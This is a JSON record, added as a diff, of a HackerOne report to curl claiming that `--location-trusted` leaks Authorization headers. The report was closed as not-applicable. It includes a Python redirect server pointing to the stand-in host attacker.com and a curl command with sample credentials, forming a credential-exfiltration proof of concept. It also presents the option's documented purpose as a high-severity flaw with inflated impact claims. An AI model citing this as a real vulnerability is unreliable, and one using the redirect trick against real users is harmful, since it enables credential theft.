@@ -1,0 +1,123 @@
+{
+  "id": 2946924,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTQ2OTI0",
+  "url": "https://hackerone.com/reports/2946924",
+  "title": "Authorization Header Leak via --location-trusted in Curl",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2025-01-18T04:07:30.291Z",
+  "submitted_at": "2025-01-18T04:07:30.520Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "voggerloops",
+    "url": "/voggerloops",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bak3v3uh4y2u7voxm81oc748324y/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-07-03T06:43:09.591Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-07-01T14:11:31.077Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Curl's --location-trusted Option Leaks Authorization Header Across Domains\nThe `--location-trusted` option in Curl forwards the Authorization header when following cross-origin redirects, exposing Basic Authentication credentials to untrusted hosts.\n\n- If an attacker controls a redirecting endpoint, they can steal credentials from any requests using Basic Auth.\n- Unlike `--location`, which strips authentication headers for security, `--location-trusted` forwards them without warning, leading to unintended  \ncredential leakage.\nThis violates authentication best practices and introduces a serious security risk\n\n---\n\nAffected Versions\nRun:\n\ncurl -V\n\n **Example Output:**\n\ncurl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.10 zlib/1.3.1\nRelease-Date: 2024-01-15\n\n **Tested on:**\n-  Linux (Ubuntu 22.04)\n-  macOS 14 Sonoma\n-  Windows 11 (WSL2)\n\n---\n ** Steps to Reproduce**\n\n **Start a Malicious Redirect Server**\nRun this Python script on an attacker-controlled machine:\n python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(302)\n        self.send_header(\"Location\", \"http://attacker.com\")\n        self.end_headers()\n\nserver = HTTPServer((\"0.0.0.0\", 8080), RedirectHandler)\nserver.serve_forever()\n```\n\n Run Curl with Authentication & --location-trusted\nExecute:\ncurl -v -L --user \"admin:password\" --location-trusted http://localhost:8080\n`\n\n---\n\n Expected Behavior\n- Curl should strip the Authorization header  when redirecting to a  different domain.\n\n Actual Behavior\n- Curl forwards the Authorization header to `attacker.com`, exposing credentials.\n\n---\n\nSupporting Material / References\n Curl Debug Log (`-v --trace curl_trace.txt`) – Shows leaked Authorization header  \nPacket Capture (`tcpdump`/Wireshark)– Confirms credentials are sent cross-origin  \n PoC Python Code (`redirect_poc.py`) – Reproduces the vulnerability locally  \n\n---\n\n Impact: What an Attacker Can Achieve\n Credential Exposure:\n- Any Basic Authentication credentials (API keys, admin passwords, cloud service tokens) are leaked if an attacker controls the redirect.\n\n Privilege Escalation:\n- Attackers can gain unauthorized access to admin interfaces, APIs, or cloud services, leading to \nfull system compromise\n\n DevOps & CI/CD Pipeline Risk:\n- Automation scripts & DevOps pipelines using `curl` may unknowingly expose credentials to untrusted redirect targets\n\n---\n\n Suggested Fix\n Immediate Workaround for Affected Users\nAvoid`--location-trusted` when authentication is involved  \nManually follow redirects by parsing `curl -i` output  \nUse API tokens instead of Basic Auth where possible  \n\n Permanent Fix for Curl Developers\nAutomatically strip Authorization headers for cross-origin redirect\nUpdate documentation to warn users about risks of `--location-trusted` \nDisplay security warnings before forwarding authentication credentials  \n\n---\nFinal Thoughts\nThis vulnerability exposes sensitive credentials to untrusted third parties, which can lead to **credential theft, account takeovers, and security breaches Fixing this issue will help protect automation scripts, CI/CD pipelines, and security-conscious developers from unintentionally leaking credentials.\n\n## Impact\n\nThe location-trusted option in Curl forwards the Authorization header when following cross-origin redirects, exposing Basic Authentication credentials to untrusted hosts.\n\nThis behavior creates a security risk where an attacker controlling a redirecting endpoint can steal credentials from any request using Basic Auth. Unlike --location, which strips authentication headers for security reasons, --location-trusted forwards them without warning, leading to unintended credential leakage.\n\nThis issue violates authentication best practices and could lead to credential theft, privilege escalation, and security breaches, particularly affecting DevOps pipelines, automation scripts, and CI/CD environments that rely on Curl.\n\nThe recommended fix is to automatically strip Authorization headers for cross-origin redirects, warn users about the risks of --location-trusted, and update documentation to reflect this issue.",
+  "weakness": {
+    "id": 113,
+    "name": "Information Exposure Through Sent Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 13,
+  "voters": [
+    "sashr",
+    "zy9ard3",
+    "thalaivar304",
+    "2026",
+    "hunt_98",
+    "awso0h1ll4",
+    "mackgoodman",
+    "rownok871",
+    "adarsh01securityanlayst",
+    "omarjamailsa",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
